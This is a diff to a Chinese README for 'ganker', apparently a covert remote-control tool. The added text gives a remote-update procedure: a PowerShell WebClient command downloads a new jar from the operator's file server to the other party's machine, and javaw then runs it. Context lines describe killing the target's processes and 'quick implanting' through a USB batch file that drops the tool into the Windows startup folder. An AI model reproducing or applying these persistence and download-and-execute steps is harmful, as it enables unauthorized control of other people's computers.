@@ -35,6 +35,7 @@
 ## ganker.jar
 命令列：`java -jar ganker.jar [port]`  
 `port`預設為`8787`  
+如果指定`port`已被佔用的話，`ganker`會嘗試以關閉`ganker`的方式關閉他，意思就是啟動第二個`ganker`時第一個就會關閉，也可以用這方法來重啟`ganker`（更新時會用到）
 
 ## gankerController.jar
 命令列：`java -jar gankerController.jar [ip] [port]`  
@@ -63,6 +64,18 @@ GUI操作：
 進階用法：用taskkill指令砍掉正在運作的程式  
 超強用法：呼叫powershell下載檔案，也可以用這方法遠端更新`ganker`  
 快速植入：寫一個batch檔在隨身碟，一執行就把`ganker`丟到開機自動啟動資料夾，然後執行
+
+# 遠端更新ganker方式
+**必須要先確保對方能用網路連到你的電腦**  
+## Windows：  
+1. 使用[fileServer](https://github.com/HSSLC/simple-java-file-server/)，或是自己架簡單的檔案伺服器，反正要能從網路取得資源就是了  
+2. 然後將新的`ganker.jar`放入檔案伺服器的檔案系統，然後啟動檔案伺服器  
+3. 在`gankerController`中輸入`powershell -Command "(New-Object net.WebClient).downloadFile('這裡填入你的ganker.jar網路資源', 'ganker.jar')"`  
+例子：`powershell -Command "(New-Object net.WebClient).downloadFile('http://192.168.0.87/ganker.jar', 'ganker.jar')"`  
+4. 然後在`gankerController`中輸入`javaw -jar ganker.jar`重啟ganker
+## 其他系統：
+看到**其他**這兩個字就知道發生什麼事了吧  
+對，窩不知道其他系統怎麼打指令，反正原理就是這樣，自行變通一下吧
 
 # 警語
 不要玩太過頭喔
